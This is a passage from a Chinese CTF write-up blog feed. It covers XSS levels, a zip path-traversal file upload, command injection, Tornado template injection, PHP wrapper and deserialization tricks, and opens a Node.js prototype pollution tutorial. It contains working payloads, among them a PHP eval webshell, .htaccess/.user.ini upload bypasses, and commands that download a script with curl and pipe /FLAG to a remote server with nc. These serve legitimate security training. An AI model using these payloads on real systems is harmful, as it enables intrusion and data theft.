4:</strong><br><img src="/../images/Pasted%20image%2020241114145041.png"></p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-keyword">var</span> <span class="hljs-built_in">time</span> = <span class="hljs-number">10</span>;            <span class="hljs-comment">// 倒计时时间，默认为10秒</span><br>    <span class="hljs-keyword">var</span> jumpUrl;<br>    <br>    <span class="hljs-comment">// 检查URL中是否有 jumpUrl 参数</span><br>    <span class="hljs-keyword">if</span> (getQueryVariable(<span class="hljs-string">&#x27;jumpUrl&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>        jumpUrl = location.href;      <br>        <span class="hljs-comment">// 如果没有 jumpUrl 参数，默认跳转到当前页面</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        jumpUrl = getQueryVariable(<span class="hljs-string">&#x27;jumpUrl&#x27;</span>); <br>        <span class="hljs-comment">// 否则设置跳转目标为URL中的 jumpUrl 参数</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// 每隔一秒执行 jump 函数，进行倒计时</span><br>    setTimeout(jump, <span class="hljs-number">1000</span>, <span class="hljs-built_in">time</span>);<br>    <br>    <span class="hljs-comment">// 定义 jump 函数，执行倒计时并更新页面显示</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">jump</span>(<span class="hljs-params">time</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">time</span> == <span class="hljs-number">0</span>) &#123;<br>            location.href = jumpUrl; <br>            <span class="hljs-comment">// 倒计时结束后跳转到指定的 jumpUrl</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">time</span> = <span class="hljs-built_in">time</span> - <span class="hljs-number">1</span>;<br>            document.getElementById(<span class="hljs-string">&#x27;ccc&#x27;</span>).innerHTML = <span class="hljs-string">`页面<span class="hljs-subst">$&#123;<span class="hljs-built_in">time</span>&#125;</span>秒后将会重定向到<span class="hljs-subst">$&#123;escape(jumpUrl)&#125;</span>`</span>; <br>            setTimeout(jump, <span class="hljs-number">1000</span>, <span class="hljs-built_in">time</span>); <br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 定义 getQueryVariable 函数，用于获取URL中的参数</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-params">variable</span>) &#123;<br>        <span class="hljs-keyword">var</span> query = window.location.search.substring(<span class="hljs-number">1</span>); <br>        <span class="hljs-comment">// 获取URL的查询字符串部分（去掉问号）</span><br>        <span class="hljs-keyword">var</span> vars = query.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;&amp;&quot;</span>);                     <br>        <span class="hljs-comment">// 按照 &amp; 分割多个参数</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; vars.<span class="hljs-built_in">length</span>; i++) &#123;<br>            <span class="hljs-keyword">var</span> pair = vars[i].<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;=&quot;</span>);              <br>             <span class="hljs-comment">// 按照 = 分割每个参数名和值</span><br>            <span class="hljs-keyword">if</span> (pair[<span class="hljs-number">0</span>] == variable) &#123;<br>                <span class="hljs-keyword">return</span> pair[<span class="hljs-number">1</span>];                          <br>                <span class="hljs-comment">// 如果参数名匹配，返回其对应的值</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;                                   <br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>分析代码，将获取到的jumpUrl的值作为目标地址，倒计时结束后使用location.href进行重定向。</p><blockquote><p><strong>JavaScript伪协议</strong>：javascript:alert(1),浏览器会把javascript:后面的内容当做代码，直接在当前页面执行。</p></blockquote><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">jumpUrl</span>=javascript:alert(1)<br></code></pre></td></tr></table></figure><p><strong>level 5:</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;autosubmit&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> autoForm = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;autoForm&#x27;</span>);</span><br><span class="language-javascript">    autoForm.<span class="hljs-property">action</span> = (<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;action&#x27;</span>) == <span class="hljs-literal">false</span>) ? location.<span class="hljs-property">href</span> : <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;action&#x27;</span>);</span><br><span class="language-javascript">    autoForm.<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">    &#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-javascript">    </span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-params">variable</span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">       <span class="hljs-keyword">var</span> query = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);</span><br><span class="language-javascript">       <span class="hljs-keyword">var</span> vars = query.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&amp;&quot;</span>);</span><br><span class="language-javascript">       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;vars.<span class="hljs-property">length</span>;i++) &#123;</span><br><span class="language-javascript">               <span class="hljs-keyword">var</span> pair = vars[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>);</span><br><span class="language-javascript">               <span class="hljs-keyword">if</span>(pair[<span class="hljs-number">0</span>] == variable)&#123;<span class="hljs-keyword">return</span> pair[<span class="hljs-number">1</span>];&#125;</span><br><span class="language-javascript">       &#125;</span><br><span class="language-javascript">       <span class="hljs-keyword">return</span>(<span class="hljs-literal">false</span>);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>填写的表单名为autoForm。如果autosubmit的值非空，并且action的值非空，那么autoForm.action（表单提交的目标地址）就是action的值，否则目标地址是当前页。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">autosubmit</span>=1&amp;action=javascript:alert(1)<br></code></pre></td></tr></table></figure><p><strong>level 6:</strong><br><img src="/../images/Pasted%20image%2020241114153247.png"></p><p><strong>前端AngularJS模板注入</strong>:<a href="https://nosec.org/home/detail/4153.html">AngularJS客户端模板注入（XSS）|NOSEC安全讯息平台 - 白帽汇安全研究院</a><br><img src="/../images/Pasted%20image%2020241114153624.png"></p><p>Angular1.4.6沙箱逃逸:</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?username=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;.constructor.prototype.charAt</span>=[].join;$eval(<span class="hljs-name">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241114154609.png"></p><h1 id="第二章-web进阶-文件上传"><a href="#第二章-web进阶-文件上传" class="headerlink" title="[第二章 web进阶]文件上传"></a>[第二章 web进阶]文件上传</h1><h2 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h2><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">  &lt;?php<br>header(<span class="hljs-string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);<br><span class="hljs-regexp">//</span> 每<span class="hljs-number">5</span>分钟会清除一次目录下上传的文件<br><br>require_once(<span class="hljs-string">&#x27;pclzip.lib.php&#x27;</span>);<br><span class="hljs-regexp">//</span>包含文件pclzip.lib.php，可能是针对zip包进行解压等操作<br><br>    <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;upload/&#x27;</span>;<br>    <span class="hljs-regexp">//</span>上传目录<br>    <span class="hljs-variable">$ext</span> = strtolower(substr(strrchr(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>));<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$dir</span>.<span class="hljs-variable">$name</span>;<br><span class="hljs-regexp">//</span>strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。<br><span class="hljs-regexp">//</span>比如上传的文件名为<span class="hljs-variable">$name</span>=<span class="hljs-number">1</span>.php.txt，这里strrchr(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>) 执行结果为.txt<br><span class="hljs-regexp">//</span>substr(strrchr(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>)<br><span class="hljs-regexp">//</span>substr字符串截取，从下标为<span class="hljs-number">1</span>开始截取，那就是把点略过，截取后为txt<br><span class="hljs-regexp">//</span>通过strtolower函数将所有字符转换为小写，赋值给ext变量<br><span class="hljs-regexp">//</span>如果我们上传的文件名为<span class="hljs-number">1</span>.txt，那么path变量就为upload/<span class="hljs-number">1</span>.txt<br><br><br><span class="hljs-regexp">//</span>递归遍历指定的目录 `<span class="hljs-variable">$dir</span>`，删除该目录及其子目录中所有不是 `jpg`、`gif` 或 `png` 文件的其他文件。<br>    <span class="hljs-keyword">function</span> check_dir(<span class="hljs-variable">$dir</span>)&#123;<br>        <span class="hljs-variable">$handle</span> = opendir(<span class="hljs-variable">$dir</span>);<br>        <span class="hljs-keyword">while</span>((<span class="hljs-variable">$f</span> = readdir(<span class="hljs-variable">$handle</span>)) !== false)&#123;<br>            <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$f</span>, array(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;..&#x27;</span>)))&#123;<br>                <span class="hljs-keyword">if</span>(is_dir(<span class="hljs-variable">$dir</span>.<span class="hljs-variable">$f</span>))&#123;<br>                    check_dir(<span class="hljs-variable">$dir</span>.<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;/&#x27;</span>);<br>                 &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$ext</span> = strtolower(substr(strrchr(<span class="hljs-variable">$f</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>));<br>                    <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$ext</span>, array(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>)))&#123;<br>                        unlink(<span class="hljs-variable">$dir</span>.<span class="hljs-variable">$f</span>);<br>                    &#125;<br>                &#125;<br>            <br>            &#125;<br>        &#125;<br>    &#125;<br>    <br><span class="hljs-regexp">//</span>创建目录    <br>    <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-variable">$dir</span>))&#123;<br>        mkdir(<span class="hljs-variable">$dir</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$temp_dir</span> = <span class="hljs-variable">$dir</span>.md5(time(). rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>));<br>    <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-variable">$temp_dir</span>))&#123;<br>        mkdir(<span class="hljs-variable">$temp_dir</span>);<br>    &#125;<br><span class="hljs-regexp">//</span>这里应该就是最难的了，大概就是将目录名拼接一个随机数，读到这里，基本上就知道需要目录穿越了。因为我们不知道随机数值，所以就算绕过上传，解析也是一大关（路径不难找，就是解析难）<br><br><br><span class="hljs-regexp">//</span>首先进行后缀的校验，把刚刚拿到的，最后一个.后面的字符串和这里的zip、jpg、gif、png进行对比校验<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$ext</span>, array(<span class="hljs-string">&#x27;zip&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>)))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ext</span> == <span class="hljs-string">&#x27;zip&#x27;</span>)&#123;<br><span class="hljs-regexp">//</span>使用PclZip进行解压缩        <br>            <span class="hljs-variable">$archive</span> = new PclZip(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-regexp">//</span>遍历解压缩后的每个目录            <br>            foreach(<span class="hljs-variable">$archive</span>-&gt;listContent() as <span class="hljs-variable">$value</span>)&#123;<br>                <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;filename&quot;</span>];<br><span class="hljs-regexp">//</span>一段较为简单的正则，就是匹配每个文件结尾的位置，是否是.php                <br>                <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\.php$/&#x27;</span>, <span class="hljs-variable">$filename</span>))&#123;<br>                     <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;压缩包内不允许含有php文件!&quot;</span>);<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$archive</span>-&gt;extract(PCLZIP_OPT_PATH, <span class="hljs-variable">$temp_dir</span>, PCLZIP_OPT_REPLACE_NEWER) == <span class="hljs-number">0</span>) &#123;<br>                check_dir(<span class="hljs-variable">$dir</span>);<br>                   <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;解压失败&quot;</span>);<br>            &#125;<br><br>            check_dir(<span class="hljs-variable">$dir</span>);<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;上传成功!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            move_uploaded_file(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$temp_dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>            check_dir(<span class="hljs-variable">$dir</span>);<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;上传成功!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;仅允许上传zip、jpg、gif、png文件!&#x27;</span>);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>分析源码可知，用户可以上传zip、jpg、gif、png文件。其中zip文件中不能包含php文件。通过zip上传后，服务器会对zip进行解压，放在upload目录下。本题需要上传恶意php，该文件要能被访问并且被服务器解析。</p><p>上传成功的文件会被放入一个随机数构造的文件目录中，所以上传的路径是upload&#x2F;随机值&#x2F;上传的文件。由于我们不知道随机值，所以要使用目录穿越，将文件上传到网站根目录。</p><p>Web服务器为Apache。由于需要构造解析，利用apache的解析漏洞，如果从右开始，直到哪个能识别就解析哪个，构造最终文件名为..&#x2F;..&#x2F;1.php.xxx，这个名字是15位的。新建一个文件，名字长度同样也是15位的，否则解压会报错。压缩成.zip文件。后缀无所谓，后面需要用010editor改。<br><img src="/../images/Pasted%20image%2020241115133145.png"></p><p>在010Edtior中打开该压缩包。修改文件名为..&#x2F;..&#x2F;1.php.xxx。Record 用于表示结构化数据的静态结构，常用于解析特定格式的数据。而 DirEntry 用于表示目录或文件列表的动态结构，常用于解析文件系统或压缩包中的目录结构。修改DirEntry的文件名为..&#x2F;..&#x2F;1.php.xxx。</p><p><img src="/../images/Pasted%20image%2020241115134010.png"></p><p>上传压缩包。访问1.php.xxx。</p><p><img src="/../images/Pasted%20image%2020241115135108.png"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ul><li>Apache php解析漏洞 ：xxx.php.xxx被当成xxx.php解析</li><li>目录穿越<ul><li>&#x2F;..&#x2F;..&#x2F;1.php.xxx：路径以 &#x2F; 开头，表示从文件系统的根目录开始解析路径。最终，..&#x2F;..&#x2F;1.php.xxx 会被解析为根目录下的 1.php.xxx，但这依赖于路径的具体实现。</li><li>..&#x2F;..&#x2F;1.php.xxx：表示从当前工作目录回退两级，最终指向该位置下的1.php.xxx文件。</li></ul></li><li>php可执行后缀 php3、php5、phtml、pht ,其中phtml的payload可以为<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;shell&#39;]);&lt;/script&gt;</code><br> 如果需要绕过图片限制，可以在载荷前一行加<code>GIF</code>.</li><li>asp可执行后缀: cdx、cer、asa，jsp可执行后缀 jspx。</li><li>将.htacess或.user.ini文件伪造成图片文件格式上传，使得含恶意载荷的jpg文件可以被当做php解析。<br><code>.htacess</code>，让含test字符的文件当做php解析</li></ul><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GIF</span><br><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;test&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><pre><code>.user.ini`</code></pre><p>表示执行该目录的php文件时都会包含test.jpg，一般需要先上传含有恶意php载荷的图片test.jpg，然后请求该目录下的*.php文件，使用antsword连接。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">GIF<br><span class="hljs-attribute">auto_prepend_file</span>=test.jpg<br></code></pre></td></tr></table></figure><h1 id="第二章-web进阶-死亡ping命令"><a href="#第二章-web进阶-死亡ping命令" class="headerlink" title="[第二章 web进阶]死亡ping命令"></a>[第二章 web进阶]死亡ping命令</h1><p>考察命令注入漏洞和多条命令执行。</p><p><img src="/../images/Pasted%20image%2020241122120549.png"></p><p><strong>做注入题目时，直接用burpsuite，防止注入的数据被浏览器转码。</strong></p><p>虽然ip ping成功，但后面的命令不一定执行。用<code>sleep 5</code>进行延时注入发现过滤了很多连接符，只有%0a可以绕过。</p><p>由于没有命令执行的回显，如何找到flag文件并且将文件数据传出来是个问题。</p><p>Docker 容器不能使用反弹 Shell，主要与其网络隔离机制和运行环境有关。</p><p>考虑到<code>&gt;</code>没有被过滤，于是从服务器下载恶意脚本到本地并执行。</p><p>服务器编写脚本1.sh：<br><img src="/../images/Pasted%20image%2020241122131354.png"></p><ul><li>cat &#x2F;FLAG：读取文件&#x2F;FLAG的内容。</li><li>|：将读取的内容通过管道传递给nc。</li><li>nc server_ip 8089：将管道中的内容通过网络发送到服务器的8089端口。</li></ul><ol><li>这里其实传了两次.sh文件，第一次的文件内容为ls | nc {server_ip port}，得到当前目录下的文件列表，发现存在&#x2F;FLAG文件，第二次的文件内容为cat &#x2F;FLAG | nc {your_server_ip port}，将&#x2F;FLAG文件内容传出来。</li></ol><p>用curl把1.sh下载到网站目录。这里使用<code>curl &#123;server_ip&#125;/1.sh</code>，然后准备给sh文件加执行权限，却无法添加，可能是当前用户在当前目录没有保存文件的权限。于是将1.sh保存到tmp目录下。</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>acurl server_ip/<span class="hljs-number">1</span>.sh &gt; /tmp/<span class="hljs-number">1</span>.sh   #请求bash文件到tmp目录<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241122130710.png"><br><img src="/../images/Pasted%20image%2020241122133044.png"></p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>%<span class="hljs-number">0</span>achmod <span class="hljs-number">777</span> /tmp/<span class="hljs-number">1</span>.sh #添加可执行权限<br></code></pre></td></tr></table></figure><p>在服务器上监听本地端口8089：<br><img src="/../images/Pasted%20image%2020241122131107.png"></p><p>执行1.sh.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一章-web入门-常见的搜集&quot;&gt;&lt;a href=&quot;#第一章-web入门-常见的搜集&quot; class=&quot;headerlink&quot; title=&quot;[第一章 web入门]常见的搜集&quot;&gt;&lt;/a&gt;[第一章 web入门]常见的搜集&lt;/h1&gt;&lt;p&gt;dirsearch -u &lt;a </summary>
      
    
    
    
    
    <category term="CTF刷题记录" scheme="http://example.com/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-Web-WP2</title>
    <link href="http://example.com/2024/11/11/BUUCTF-Web-WP2/"/>
    <id>http://example.com/2024/11/11/BUUCTF-Web-WP2/</id>
    <published>2024-11-11T13:17:20.000Z</published>
    <updated>2024-12-09T08:33:19.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>打开页面发现三个链接:<br><img src="/../images/Pasted%20image%2020241111214245.png"><br>各自的文本是：</p><figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">flag</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> /<span class="hljs-variable">fllllllllllllag</span><br><span class="hljs-variable">render</span><br><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>))</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241111214819.png"></p><p>观察到url都是filename+filehash的格式。根据hints，目前需要cookie_secret。</p><p>尝试把filename改成&#x2F;fllllllllllllag：<br><img src="/../images/Pasted%20image%2020241111221449.png"></p><blockquote><p>[!NOTE]<br>在Python中，“render”是一个非常常用的术语，特别是在Web开发和Web框架中。它通常与模板引擎一起使用，用于将模板和上下文变量渲染成一个最终的文本或HTML输出。</p></blockquote><p>想到模板注入。更改msg,页面发生同样变化：<br><img src="/../images/Pasted%20image%2020241111223445.png"></p><p>构造payload:<code>/error?msg=&#123;3*3&#125;&#125;</code>，发现被过滤了。<br><img src="/../images/Pasted%20image%2020241111222301.png"></p><blockquote><p>[!NOTE] Title<br>Tornado是python的一个模板。在Tornado里，应用的设置可以通过handler.settings访问。</p></blockquote><p><img src="/../images/Pasted%20image%2020241111223900.png"></p><p><img src="/../images/Pasted%20image%2020241111230540.png"><br><img src="/../images/Pasted%20image%2020241111230727.png"></p><p><img src="/../images/Pasted%20image%2020241111230714.png"></p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p><img src="/../images/Pasted%20image%2020241115191859.png"></p><p>分析代码，需要传递三个get参数：text,file,password。</p><p><strong>isset</strong>：是检测变量是否已设置并且非nul。<br>**file_get_contents()**：把文件内容读到一个字符串中。<br>text文件内容需要是welcome to the zjctf。</p><p>这里用到的是data伪协议：它允许将原始数据嵌入到 URL 中，适用于无法直接上传文件或插入代码的情况下。<br><img src="/../images/Pasted%20image%2020241115193143.png"></p><p>第一个payload：</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-keyword">text</span>=data://<span class="hljs-keyword">text</span>/plain,welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br></code></pre></td></tr></table></figure><p>file参数不能出现flag字符。提示了useless.php。读取useless.php的源码，需要用到php:&#x2F;&#x2F;filter伪协议。</p><blockquote><p>[!NOTE]<br>include 函数仅能使用 php:&#x2F;&#x2F;filter进行读取操作，且被读取的数据将被包含至当前 PHP 上下文中，作为 PHP 代码进行执行。<br>一般对其进行base64编码，让其不执行，从而导致任意文件读取。</p></blockquote><p>第二个payload:</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver">?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241115195408.png"></p><p><img src="/../images/Pasted%20image%2020241115195504.png"></p><p>最后序列化一个file&#x3D;flag.php的Flag对象，传递给password参数。</p><p><img src="/../images/Pasted%20image%2020241115200428.png"></p><p>第三个payload：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>assword=<span class="hljs-symbol">O:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;Flag&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">4</span><span class="hljs-symbol">:<span class="hljs-string">&quot;file&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">8</span><span class="hljs-symbol">:<span class="hljs-string">&quot;flag.php&quot;</span></span>;&#125;   <br></code></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">？<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome <span class="hljs-keyword">to</span> the zjctf&amp;file=useless.php&amp;<span class="hljs-keyword">password</span>=O:<span class="hljs-number">4</span>:&quot;Flag&quot;:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:&quot;file&quot;;s:<span class="hljs-number">8</span>:&quot;flag.php&quot;;&#125;  <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241115200722.png"></p><p>F12读取源码获取flag。<br><img src="/../images/Pasted%20image%2020241115201151.png"></p><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;护网杯-2018-easy-tornado&quot;&gt;&lt;a href=&quot;#护网杯-2018-easy-tornado&quot; class=&quot;headerlink&quot; title=&quot;[护网杯 2018]easy_tornado&quot;&gt;&lt;/a&gt;[护网杯 2018]easy_tornado</summary>
      
    
    
    
    
    <category term="CTF刷题记录" scheme="http://example.com/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Node.js原型链污染</title>
    <link href="http://example.com/2024/11/05/Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://example.com/2024/11/05/Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2024-11-05T07:39:06.000Z</published>
    <updated>2024-12-09T08:32:35.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h1><h2 id="继承与原型链"><a href="#继承与原型链" class="headerlink" title="继承与原型链"></a>继承与原型链</h2><p>在JavaScript中，继承是通过原型链实现的。</p><p>JavaScript 只有一种结构：对象(object)。每个对象都有一个私有属性指向另一个名为原型（prototype)的对象。原型对象也有一个自己的原型，层层向上直到一个对象的原型为 <code>null</code>。整体看来就是多个对象层层继承，实例对象的原型链接形成了一条链，也就是 js 的原型链。</p><p>一个对象的原型可以通过其<code>__proto__</code> 属性访问。</p><p>举个例子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br>person1.<span class="hljs-title function_">sayHello</span>();  <span class="hljs-comment">// 输出: Hello, my name is Alice</span><br></code></pre></td></tr></table></figure><p>上面的例子创建了一个名为Person的构造函数，并将<code>prototype</code>上的sayHello设置为一个打招呼的函数。<code>prototype</code>是<code>Person</code>的一个属性，所有用类<code>Person</code>进行实例化的对象，都会拥有<code>prototype</code>的全部内容。所以当创建一个名为person1的实例时，它会继承<code>Person.prototype</code>对象上的sayHello方法。因此，当调用person1.sayHello()时，会输出“Hello, my name is Alice”。</p><p><img src="/../images/Pasted%20image%2020241105164425.png"></p><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" 